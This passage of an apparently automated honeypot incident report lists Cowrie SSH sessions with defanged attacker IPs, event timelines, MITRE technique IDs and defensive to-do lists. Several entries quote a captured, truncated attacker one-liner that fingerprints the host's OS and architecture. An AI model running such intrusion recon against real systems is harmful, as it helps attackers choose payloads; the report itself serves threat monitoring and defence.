- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cae2700dbbc

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-08-01 13:24 |
| **Last Seen** | 2026-08-01 13:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:24:58` | `cowrie.session.connect` |
| `2026-08-01 13:24:59` | `cowrie.client.version` |
| `2026-08-01 13:24:59` | `cowrie.client.kex` |
| `2026-08-01 13:25:01` | `cowrie.login.success` |
| `2026-08-01 13:25:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093b209c3789

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-01 13:25 |
| **Last Seen** | 2026-08-01 13:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:25:06` | `cowrie.session.connect` |
| `2026-08-01 13:25:06` | `cowrie.client.version` |
| `2026-08-01 13:25:06` | `cowrie.client.kex` |
| `2026-08-01 13:25:07` | `cowrie.login.success` |
| `2026-08-01 13:25:08` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81d849b427d

| Field | Detail |
|---|---|
| **Source IP** | `185.113.9[.]199` |
| **First Seen** | 2026-08-01 13:25 |
| **Last Seen** | 2026-08-01 13:31 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:25:59` | `cowrie.session.connect` |
| `2026-08-01 13:25:59` | `cowrie.client.version` |
| `2026-08-01 13:26:02` | `cowrie.client.kex` |
| `2026-08-01 13:26:04` | `cowrie.login.success` |
| `2026-08-01 13:31:04` | `cowrie.session.file_upload` |
| `2026-08-01 13:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.113.9[.]199` to AbuseIPDB if not already reported
- [ ] Block `185.113.9[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b2fac6d1eb2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:26 |
| **Last Seen** | 2026-08-01 13:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:26:37` | `cowrie.session.connect` |
| `2026-08-01 13:26:37` | `cowrie.client.version` |
| `2026-08-01 13:26:37` | `cowrie.client.kex` |
| `2026-08-01 13:26:38` | `cowrie.login.success` |
| `2026-08-01 13:26:39` | `cowrie.session.params` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.success` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.command.input` |
| `2026-08-01 13:26:39` | `cowrie.log.closed` |
| `2026-08-01 13:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4822d96e952c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:28 |
| **Last Seen** | 2026-08-01 13:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:28:14` | `cowrie.session.connect` |
| `2026-08-01 13:28:14` | `cowrie.client.version` |
| `2026-08-01 13:28:14` | `cowrie.client.kex` |
| `2026-08-01 13:28:15` | `cowrie.login.success` |
| `2026-08-01 13:28:16` | `cowrie.session.params` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:16` | `cowrie.command.success` |
| `2026-08-01 13:28:16` | `cowrie.command.input` |
| `2026-08-01 13:28:17` | `cowrie.command.input` |
| `2026-08-01 13:28:17` | `cowrie.command.input` |
| `2026-08-01 13:28:17` | `cowrie.command.input` |
| `2026-08-01 13:28:17` | `cowrie.log.closed` |
| `2026-08-01 13:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1028dcd7b117

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]125` |
| **First Seen** | 2026-08-01 13:28 |
| **Last Seen** | 2026-08-01 13:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:28:59` | `cowrie.session.connect` |
| `2026-08-01 13:28:59` | `cowrie.client.version` |
| `2026-08-01 13:28:59` | `cowrie.client.kex` |
| `2026-08-01 13:29:00` | `cowrie.login.success` |
| `2026-08-01 13:29:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:29:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:29:00` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]125` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a68c722e194

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:29 |
| **Last Seen** | 2026-08-01 13:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:29:50` | `cowrie.session.connect` |
| `2026-08-01 13:29:50` | `cowrie.client.version` |
| `2026-08-01 13:29:50` | `cowrie.client.kex` |
| `2026-08-01 13:29:51` | `cowrie.login.success` |
| `2026-08-01 13:29:52` | `cowrie.session.params` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.success` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.command.input` |
| `2026-08-01 13:29:52` | `cowrie.log.closed` |
| `2026-08-01 13:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f545a46718

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 13:30 |
| **Last Seen** | 2026-08-01 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:30:47` | `cowrie.session.connect` |
| `2026-08-01 13:30:47` | `cowrie.client.version` |
| `2026-08-01 13:30:47` | `cowrie.client.kex` |
| `2026-08-01 13:30:47` | `cowrie.login.success` |
| `2026-08-01 13:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e4d5504246

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 13:30 |
| **Last Seen** | 2026-08-01 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:30:47` | `cowrie.session.connect` |
| `2026-08-01 13:30:47` | `cowrie.client.version` |
| `2026-08-01 13:30:47` | `cowrie.client.kex` |
| `2026-08-01 13:30:47` | `cowrie.login.success` |
| `2026-08-01 13:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ac4c3e9a53

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 13:30 |
| **Last Seen** | 2026-08-01 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:30:48` | `cowrie.session.connect` |
| `2026-08-01 13:30:48` | `cowrie.client.version` |
| `2026-08-01 13:30:48` | `cowrie.client.kex` |
| `2026-08-01 13:30:48` | `cowrie.login.success` |
| `2026-08-01 13:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c022bd3ad4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 13:30 |
| **Last Seen** | 2026-08-01 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:30:48` | `cowrie.session.connect` |
| `2026-08-01 13:30:48` | `cowrie.client.version` |
| `2026-08-01 13:30:48` | `cowrie.client.kex` |
| `2026-08-01 13:30:48` | `cowrie.login.success` |
| `2026-08-01 13:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db0a8eeefb8

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]125` |
| **First Seen** | 2026-08-01 13:31 |
| **Last Seen** | 2026-08-01 13:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:31:12` | `cowrie.session.connect` |
| `2026-08-01 13:31:12` | `cowrie.client.version` |
| `2026-08-01 13:31:22` | `cowrie.client.kex` |
| `2026-08-01 13:31:24` | `cowrie.login.success` |
| `2026-08-01 13:31:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:31:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:31:24` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]125` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24d600d23d6b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:31 |
| **Last Seen** | 2026-08-01 13:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:31:27` | `cowrie.session.connect` |
| `2026-08-01 13:31:27` | `cowrie.client.version` |
| `2026-08-01 13:31:27` | `cowrie.client.kex` |
| `2026-08-01 13:31:28` | `cowrie.login.success` |
| `2026-08-01 13:31:29` | `cowrie.session.params` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.success` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.command.input` |
| `2026-08-01 13:31:29` | `cowrie.log.closed` |
| `2026-08-01 13:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471505fcce93

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:33 |
| **Last Seen** | 2026-08-01 13:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:33:06` | `cowrie.session.connect` |
| `2026-08-01 13:33:06` | `cowrie.client.version` |
| `2026-08-01 13:33:07` | `cowrie.client.kex` |
| `2026-08-01 13:33:07` | `cowrie.login.success` |
| `2026-08-01 13:33:08` | `cowrie.session.params` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.success` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.command.input` |
| `2026-08-01 13:33:08` | `cowrie.log.closed` |
| `2026-08-01 13:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de2f487e158

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 13:33 |
| **Last Seen** | 2026-08-01 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:33:10` | `cowrie.session.connect` |
| `2026-08-01 13:33:10` | `cowrie.client.version` |
| `2026-08-01 13:33:10` | `cowrie.client.kex` |
| `2026-08-01 13:33:11` | `cowrie.login.success` |
| `2026-08-01 13:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2570eca419c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:34 |
| **Last Seen** | 2026-08-01 13:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:34:46` | `cowrie.session.connect` |
| `2026-08-01 13:34:46` | `cowrie.client.version` |
| `2026-08-01 13:34:46` | `cowrie.client.kex` |
| `2026-08-01 13:34:47` | `cowrie.login.success` |
| `2026-08-01 13:34:48` | `cowrie.session.params` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.success` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.command.input` |
| `2026-08-01 13:34:48` | `cowrie.log.closed` |
| `2026-08-01 13:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87bd825b925

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 13:34 |
| **Last Seen** | 2026-08-01 13:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:34:49` | `cowrie.session.connect` |
| `2026-08-01 13:34:49` | `cowrie.client.version` |
| `2026-08-01 13:34:51` | `cowrie.client.kex` |
| `2026-08-01 13:34:57` | `cowrie.login.success` |
| `2026-08-01 13:34:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:34:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:34:58` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-100723da739a

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 13:34 |
| **Last Seen** | 2026-08-01 13:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:34:52` | `cowrie.session.connect` |
| `2026-08-01 13:34:52` | `cowrie.client.version` |
| `2026-08-01 13:34:52` | `cowrie.client.kex` |
| `2026-08-01 13:34:54` | `cowrie.login.success` |
| `2026-08-01 13:34:54` | `cowrie.direct-tcpip.request` |
| `2026-08-01 13:34:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 13:34:55` | `cowrie.direct-tcpip.data` |
| `2026-08-01 13:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98aadb32e6fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 13:36 |
| **Last Seen** | 2026-08-01 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 13:36:24` | `cowrie.session.connect` |
| `2026-08-01 13:36:24` | `cowrie.client.version` |
| `2026-08-01 13:36:24` | `cowrie.client.kex` |
| `2026-08-01 13:36:25` | `cowrie.login.success` |
| `2026-08-01 13:36:26` | `cowrie.session.params` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
| `2026-08-01 13:36:26` | `cowrie.command.input` |
